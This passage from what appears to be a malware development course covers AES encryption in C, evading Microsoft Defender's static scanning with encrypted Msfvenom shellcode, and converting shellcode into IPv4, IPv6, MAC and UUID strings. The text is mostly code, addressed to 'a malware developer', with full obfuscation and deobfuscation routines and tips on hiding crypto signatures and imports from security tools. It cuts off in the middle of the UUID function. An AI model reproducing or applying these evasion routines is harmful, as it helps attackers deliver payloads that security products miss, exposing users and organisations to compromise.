	PrintHexData("PlainText", pPlaintext, dwPlainSize);
	
	// this will print: "This is a plain text string, we'll try to encrypt/decrypt !"
	printf("Data: %s \n", pPlaintext);
	
	// Clean up
	HeapFree(GetProcessHeap(), 0, pPlaintext);
	system("PAUSE");
	return 0;
}

```

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/encryption-new-225953480-03161b1a-119f-4c97-9b9e-11745047a214.png)

#### bCrypt Library Drawbacks

One of the primary drawbacks of using the method outlined above to implement AES encryption is that the usage of the cryptographic WinAPIs results in them being visible in the binary's Import Address Table (IAT). Security solutions can detect the use of cryptographic functions by scanning the IAT, which can potentially indicate malicious behavior or raise suspicion. Hiding WinAPIs in the IAT is possible and will be discussed in a future module.

The image below shows the IAT of the binary using Windows APIs for AES encryption. The usage of the??`crypt.dll`??library and the cryptographic functions is clearly visible.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/iat-aes.png)

### AES Using Tiny-AES Library

This section makes use of the??[tiny-AES-c](https://github.com/kokke/tiny-AES-c)??third-party encryption library that performs AES encryption without the use of WinAPIs. Tiny-AES-C is a small portable library that can perform AES128/192/256 in C.

#### Setting Up Tiny-AES

To begin using Tiny-AES there are two requirements:

1. Include??`aes.hpp`??(C++) or include??`aes.h`??(C) in the project.
    
2. Add the??`aes.c`??file to the project.
    

#### Tiny-AES Library Drawbacks

Before diving into the code it's important to be aware of the drawbacks of the tiny-AES library.

1. The library does not support padding. All buffers must be multiples of 16 bytes.
    
2. The??[arrays](https://github.com/kokke/tiny-AES-c/blob/master/aes.c#L79)??used in the library can be signatured by security solutions to detect the usage of Tiny-AES. These arrays are used to apply the AES algorithm and therefore are a requirement to have in the code. With that being said, there are ways to modify their signature in order to avoid security solutions detecting the usage of Tiny-AES. One possible solution is to XOR these arrays, for example, to decrypt them at runtime right before calling the initialization function,??`AES_init_ctx_iv`.
    

#### Custom Padding Function

The lack of padding support can be solved by creating a custom padding function as shown in the code snippet below.

```c
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer        = NULL;
	SIZE_T	PaddedSize          = NULL;

	// calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer){
		return FALSE;
	}
	// cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// copying old buffer to new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	//saving results :
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize   = PaddedSize;

	return TRUE;
}
```

#### Tiny-AES Encryption

Similar to how the bCrypt library's encryption and decryption process was explained earlier in the module, the snippets below explain Tiny-AES's encryption and decryption process.

```c
#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// "this is plaintext string, we'll try to encrypt... lets hope everything goes well :)" in hex
// since the upper string is 82 byte in size, and 82 is not mulitple of 16, we cant encrypt this directly using tiny-aes
unsigned char Data[] = {
	0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x70, 0x6C, 0x61, 0x6E,
	0x65, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x69, 0x6E, 0x67,
	0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74, 0x72, 0x79, 0x20,
	0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x2E, 0x2E,
	0x2E, 0x20, 0x6C, 0x65, 0x74, 0x73, 0x20, 0x68, 0x6F, 0x70, 0x65, 0x20,
	0x65, 0x76, 0x65, 0x72, 0x79, 0x74, 0x68, 0x69, 0x67, 0x6E, 0x20, 0x67,
	0x6F, 0x20, 0x77, 0x65, 0x6C, 0x6C, 0x20, 0x3A, 0x29, 0x00
};



int main() {
	// struct needed for Tiny-AES library
	struct AES_ctx ctx;


	BYTE pKey[KEYSIZE];                             // KEYSIZE is 32 bytes
	BYTE pIv[IVSIZE];                               // IVSIZE is 16 bytes
		

	srand(time(NULL));                              // the seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);             // generating the key bytes
	
	srand(time(NULL) ^ pKey[0]);                    // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);               // Generating the IV

	// Prints both key and IV to the console
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Initializing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);


	// Initializing variables that will hold the new buffer base address in the case where padding is required and its size
	PBYTE	PaddedBuffer        = NULL;
	SIZE_T	PAddedSize          = NULL;

	// Padding the buffer, if required
	if (sizeof(Data) % 16 != 0){
		PaddBuffer(Data, sizeof(Data), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", PaddedBuffer, PAddedSize);
	}
	// No padding is required, encrypt 'Data' directly
	else {
		AES_CBC_encrypt_buffer(&ctx, Data, sizeof(Data));
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", Data, sizeof(Data));
	}
	// Freeing PaddedBuffer, if necessary
	if (PaddedBuffer != NULL){
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}
	system("PAUSE");
	return 0;
}

```

#### Tiny-AES Decryption

```c
#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// Key
unsigned char pKey[] = {
		0xFA, 0x9C, 0x73, 0x6C, 0xF2, 0x3A, 0x47, 0x21, 0x7F, 0xD8, 0xE7, 0x1A, 0x4F, 0x76, 0x1D, 0x84,
		0x2C, 0xCB, 0x98, 0xE3, 0xDC, 0x94, 0xEF, 0x04, 0x46, 0x2D, 0xE3, 0x33, 0xD7, 0x5E, 0xE5, 0xAF };

// IV
unsigned char pIv[] = {
		0xCF, 0x00, 0x86, 0xE1, 0x6D, 0xA2, 0x6B, 0x06, 0xC4, 0x8B, 0x1F, 0xDA, 0xB6, 0xAB, 0x21, 0xF1 };

// Encrypted data, multiples of 16 bytes
unsigned char CipherText[] = {
		0xD8, 0x9C, 0xFE, 0x68, 0x97, 0x71, 0x5E, 0x5E, 0x79, 0x45, 0x3F, 0x05, 0x4B, 0x71, 0xB9, 0x9D,
		0xB2, 0xF3, 0x72, 0xEF, 0xC2, 0x64, 0xB2, 0xE8, 0xD8, 0x36, 0x29, 0x2A, 0x66, 0xEB, 0xAB, 0x80,
		0xE4, 0xDF, 0xF2, 0x3C, 0xEE, 0x53, 0xCF, 0x21, 0x3A, 0x88, 0x2C, 0x59, 0x8C, 0x85, 0x26, 0x79,
		0xF0, 0x04, 0xC2, 0x55, 0xA8, 0xDE, 0xB4, 0x50, 0xEE, 0x00, 0x65, 0xF8, 0xEE, 0x7C, 0x54, 0x98,
		0xEB, 0xA2, 0xD5, 0x21, 0xAA, 0x77, 0x35, 0x97, 0x67, 0x11, 0xCE, 0xB3, 0x53, 0x76, 0x17, 0xA5,
		0x0D, 0xF6, 0xC3, 0x55, 0xBA, 0xCD, 0xCF, 0xD1, 0x1E, 0x8F, 0x10, 0xA5, 0x32, 0x7E, 0xFC, 0xAC };



int main() {

	// Struct needed for Tiny-AES library
	struct AES_ctx ctx;
	// Initializing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Decrypting
	AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
	 
	// Print the decrypted buffer to the console
	PrintHexData("PlainText", CipherText, sizeof(CipherText));

	// Print the string
	printf("Data: %s \n", CipherText);

	// exit
	system("PAUSE");
	return 0;
}
```

### Tiny-AES IAT

The image below shows a binary's IAT which uses Tiny-AES to perform encryption instead of WinAPIs. No cryptographic functions are visible in the IAT of the binary.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/iat-no-winapis.png)

### Conclusion

This module explained the basics of AES and provided two working AES implementations. One should also have an idea of how security solutions will detect the usage of encryption libraries.
# 2.8 Evading Microsoft Defender Static Analysis

### Introduction

This module provides an example using XOR, RC4, and AES encryption algorithms to bypass Microsoft Defender's static analysis engine. At this point of the modules, the payload is not being executed, rather it's simply being printed to the console. Therefore, this module will be focusing specifically on static/signature evasion.

### Code Samples

There are 4 code samples available for download that this module uses. Each of the code samples is using a Msfvenom shellcode.

1. Raw Shellcode - Detected by Defender
    
2. XOR Encrypted Shellcode - Evades Defender successfully
    
3. AES Encrypted Shellcode - Evades Defender successfully
    
4. RC4 Encrypted Shellcode - Evades Defender successfully
    

The sections below show the binaries being executed and Microsoft Defender's response. Recall that Microsoft Defender has a pre-configured exclusion for the??`C:\Users\MalDevUser\Desktop\Module-Code`??folder.

#### Raw Shellcode

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/raw-shellcode-defender.png)

#### XOR Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/xor-shellcode-defender.png)

#### AES Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/aes-shellcode-defender.png)

#### RC4 Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rc4-shellcode-defender.png)
# 2.9 Payload Obfuscation - IPv4-IPv6Fuscation

### Introduction

At this stage of the learning path, one should have a fundamental understanding of payload encryption. This module will explore another method of evading static detection using payload obfuscation.

A malware developer should have several tools available at their disposal to achieve the same task in order to stay unpredictable. Payload obfuscation can be seen as a different "tool" when compared to payload encryption, yet both are ultimately used for the same purpose.

After going through this module, one should be able to use advanced payload obfuscation techniques, some of which are being used in the wild, such as in??[Hive ransomware](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/).

The code shown in this module and upcoming modules should be compiled in release mode. Compiling in debug mode will result in the binary not working correctly.

### What is IPv4/IPv6Fuscation

IPv4/IPv6Fuscation is an obfuscation technique where the shellcode's bytes are converted to IPv4 or IPv6 strings. Let's use a few bytes from the Msfvenom x64 calc shellcode and analyze how they can be converted into either IPv4 or IPv6 strings. For this example, the following bytes are used:

`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`.

- **IPv4Fuscation**??- Since IPv4 addresses are composed of 4 octets, IPv4Fuscation uses 4 bytes to generate a single IPv4 string with each byte representing an octet. Take each byte, which is currently in hex and convert it to decimal format to get one octet. Using the above bytes as an example,??`FC`??is 252 in decimal,??`48`??is 72,??`83`??is 131 and??`E4`??is 228. Therefore, the first 4 bytes of the sample shellcode,??`FC 48 83 E4`??will be??`252.72.131.228`.
    
- **IPv6Fuscation**??- This will utilize similar logic as the IPv4Fuscation example but instead of using 4 bytes per IP address, 16 bytes are used to generate one IPv6 address. Furthermore, converting the bytes to decimal is not a requirement for IPv6 addresses. Using the sample shellcode as an example, it will be??`FC48:83E4:F0E8:C000:0000:4151:4150:5251`.
    

### IPv4Fuscation Implementation

Now that the logic has been explained, this section will dive into the implementation of IPv4Fuscation. A few points about the code snippet below:

- As previously mentioned, generating an IPv4 address requires 4 bytes therefore the shellcode must be multiples of 4. It's possible to create a function that pads the shellcode if it doesn't meet that requirement. Padding issues in the obfuscation modules are addressed in the the upcoming??_HellShell_??module.
    
- `GenerateIpv4`??is a helper function that takes 4 shellcode bytes and uses??`sprintf`??to generate the IPv4 address.
    
- Lastly, the code only covers obfuscation whereas deobfuscation is explained later in the module.
    

```c
// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
	unsigned char Output [32];

	// Creating the IPv4 address and saving it to the 'Output' variable 
	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}


// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 4, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
		return FALSE;
	}
	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));
	
	// We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 4.
	int c = 4, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
		if (c == 4) {
			counter++;

			// Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

			if (i == ShellcodeSize - 4) {
				// Printing the last IPv4 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv4 address
				printf("\"%s\", ", IP);
			}

			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 8 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}
```

### IPv6Fuscation Implementation

When using IPv6Fuscation, the shellcode should be a multiple of 16. Again, it's possible to create a function that pads the shellcode if it doesn't meet that requirement.

```c
// Function takes in 16 raw bytes and returns them in an IPv6 address string format
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each IPv6 segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in an IPv6 (32 * 4 = 128)
	char result[128];

	// Generating output0 using the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X:%0.2X%0.2X", a, b, c, d);

	// Generating output1 using the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X:%0.2X%0.2X", e, f, g, h);

	// Generating output2 using the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X:%0.2X%0.2X", i, j, k, l);

	// Generating output3 using the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X:%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the IPv6 address
	sprintf(result, "%s:%s:%s:%s", Output0, Output1, Output2, Output3);

	// Optional: Print the 'result' variable to the console
	// printf("[i] result: %s\n", (char*)result);

	return (char*)result;
}


// Generate the IPv6 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0){
		return FALSE;
	}
	printf("char* Ipv6Array [%d] = { \n\t", (int)(ShellcodeSize / 16));
	
	// We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* IP = NULL;
	
	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
		if (c == 16) {
			counter++;

			// Generating the IPv6 address from 16 bytes which begin at i until [i + 15]
			IP = GenerateIpv6(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last IPv6 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv6 address
				printf("\"%s\", ", IP);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}

```

### IPv4/IPv6Fuscation Deobfuscation

Once the obfuscated payload has evaded static detection, it will need to be deobfuscated to be executed. The deobfuscation process will reverse the obfuscation process, allowing an IP address to generate bytes instead of using bytes to generate an IP address. Performing deobfuscation will require the following:

- **IPv4 Deobfuscation**??- This requires the use of the NTAPI??[RtlIpv4StringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv4stringtoaddressa). It converts a string representation of an IPv4 address to a binary IPv4 address.
    
- **IPv6 Deobfuscation**??- Similar to the previous function, IPv6 deobfuscation will require the use of another NTAPI??[RtlIpv6StringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressa). This function converts an IPv6 address to a binary IPv6 address.
    

### Deobfuscating IPv4Fuscation Payloads

The??`Ipv4Deobfuscation`??function takes in an??`Ipv4Array`??as the first parameter which is an array of IPv4 addresses. The second parameter is the??`NmbrOfElements`??which is the number of IPv4 addresses in the??`Ipv4Array`??array in order to loop through the size of the array. The last 2 parameters,??`ppDAddress`??and??`pDSize`??will be used to store the deobfuscated payload and its size, respectively.

The deobfuscation process works by first grabbing the address of??`RtlIpv4StringToAddressA`??using??`GetProcAddress`??and??`GetModuleHandle`. Next, a buffer is allocated which will eventually store the deobfuscated payload of size??`NmbrOfElements`??* 4. The reasoning behind that size is that each IPv4 will generate 4 bytes.

Moving onto the for loop, it starts by defining a new variable,??`TmpBuffer`, and setting it to be equal to??`pBuffer`. Next,??`TmpBuffer`??is passed to??`RtlIpv4StringToAddressA`??as its fourth parameter, which is where the binary representation of the IPv4 address will be stored. The??`RtlIpv4StringToAddressA`??function will write 4 bytes to the??`TmpBuffer`??buffer, therefore??`TmpBuffer`??is incremented by 4, after, to allow the next 4 bytes to be written to it without overwriting the previous bytes.

Finally,??`ppDAddress`??and??`pDSize`??are set to hold the base address of the deobfuscated payload as well as its size.

```c
typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR		S,
	BOOLEAN		Strict,
	PCSTR*		Terminator,
   	PVOID		Addr
);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;

	SIZE_T          sBuffSize               = NULL;

	PCSTR           Terminator              = NULL;

	NTSTATUS        STATUS                  = NULL;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in Ipv4Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 address at a time
		// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
			return FALSE;
		}

		// 4 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress     = pBuffer;
	*pDSize         = sBuffSize;

	return TRUE;
}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/ipv4fuscation.png)

### Deobfuscating IPv6Fuscation Payloads

Everything in the deobfuscation process for IPv6 is the same as IPv4 with the only two main differences being:

1. `RtlIpv6StringToAddressA`??is used instead of??`RtlIpv4StringToAddressA`.
    
2. Each IPv6 address is being deobfuscated into 16 bytes instead of 4 bytes.
    

```c
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR		S,
	PCSTR*		Terminator,
	PVOID		Addr
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;

	SIZE_T          sBuffSize               = NULL;

	PCSTR           Terminator              = NULL;

	NTSTATUS        STATUS                  = NULL;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv6 addresses * 16
	sBuffSize = NmbrOfElements * 16;


	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the IPv6 addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv6 address at a time
		// Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress  = pBuffer;
	*pDSize      = sBuffSize;

	return TRUE;

}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/ipv6fuscation.png)

[Previous](https://maldevacademy.com/modules/20?view=blocks&hide=true)
# 3.0 Payload Obfuscation - MACFucscation

### Introduction

This module will go through another obfuscation technique that is similar to IPv4/IPv6fuscation but instead converts shellcode to MAC addresses.

### MACFuscation Implementation

The implementation of MACFuscation will be similar to what was done in the previous module with IPv4/IPv6fuscation. A MAC address is made up of 6 bytes, therefore the shellcode should be a multiple of 6, which again can be padded if it doesn't meet that requirement.

```c
// Function takes in 6 raw bytes and returns them in a MAC address string format
char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
	char Output[64];

	// Creating the MAC address and saving it to the 'Output' variable 
	sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",a, b, c, d, e, f);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 6, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
		return FALSE;
	}
	printf("char* MacArray [%d] = {\n\t", (int)(ShellcodeSize / 6));

	// We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 6.
	int c = 6, counter = 0;
	char* Mac = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
		if (c == 6) {
			counter++;
			
			// Generating the MAC address from 6 bytes which begin at i until [i + 5] 
			Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);
			
			if (i == ShellcodeSize - 6) {

				// Printing the last MAC address
				printf("\"%s\"", Mac);
				break;
			}
			else {
				// Printing the MAC address
				printf("\"%s\", ", Mac);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 6 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}

```

#### Deobfuscating MACFuscation Payloads

The deobfuscation process will reverse the obfuscation process, allowing a MAC address to generate bytes instead of using bytes to generate a MAC address. Performing deobfuscation will require the use of the NTDLL API function??[RtlEthernetStringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetstringtoaddressa). This function converts a MAC address from a string representation to its binary format.

```c
typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
	PCSTR		S,
	PCSTR* 		Terminator,
	PVOID		Addr
);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer        = NULL,
                   TmpBuffer      = NULL;

	SIZE_T         sBuffSize      = NULL;

	PCSTR          Terminator     = NULL;

	NTSTATUS       STATUS         = NULL;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of MAC addresses * 6
	sBuffSize = NmbrOfElements * 6;


	// Allocating memeory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the MAC addresses saved in MacArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one MAC address at a time
		// MacArray[i] is a single Mac address from the array MacArray
		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
			return FALSE;
		}

		// 6 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 6 to store the
		TmpBuffer = (PBYTE)(TmpBuffer + 6);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress  = pBuffer;
	*pDSize      = sBuffSize;

	return TRUE;

}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/macfuscation.png)
# 3.1 Payload Obfuscation - UUIDFuscation

### Introduction

In this module, another obfuscation technique is covered which converts shellcode to a Universally Unique IDentifier (UUID) string. UUID is a 36-character alphanumeric string that can be used to identify information.

### UUID Structure

The UUID format is made up of 5 segments of different sizes which look something like this:??`801B18F0-8320-4ADA-BB13-41EA1C886B87`. The image below illustrates the UUID structure.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/uuid.png)

Converting UUID to shellcode is a little less straightforward than the previous obfuscation methods. For example??`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`??does??**not**??translate into??`FC4883E4-F0E8-C000-0000-415141505251`, instead, it becomes??`E48348FC-E8F0-00C0-0000-415141505251`.

Notice that the first 3 segments are using the same bytes in our shellcode but the order is in reverse. The reason is that the first three segments use??[little-endian](https://en.wikipedia.org/wiki/Endianness)??byte ordering. To ensure complete understanding, the segments are broken down below.

#### Little Endian

- Segment 1:??`FC 48 83 E4`??becomes??`E4 83 48 FC`??in the UUID string
    
- Segment 2:??`F0 E8`??becomes??`E8 F0`??in the UUID string
    
- Segment 3:??`C0 00`??becomes??`00 C0`??in the UUID string
    

#### Big Endian

- Segment 4:??`00 00`??becomes??`00 00`??in the UUID string
    
- Segment 5:??`41 51 41 50 52 51`??becomes??`41 51 41 50 52 51`??in the UUID string
    

### UUIDFuscation Implementation

A UUID address is made up of 16 bytes, therefore the shellcode should be a multiple of 16. UUIDFuscation will resemble IPv6Fuscation closely due to both requiring shellcode multiples of 16 bytes. Again, padding can be used if the shellcode doesn't meet that requirement.

```c
// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in a UUID (32 * 4 = 128)
	char result[128];

	// Generating output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generating output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);

	// Generating output2 from the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);

	// Generating output3 from the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

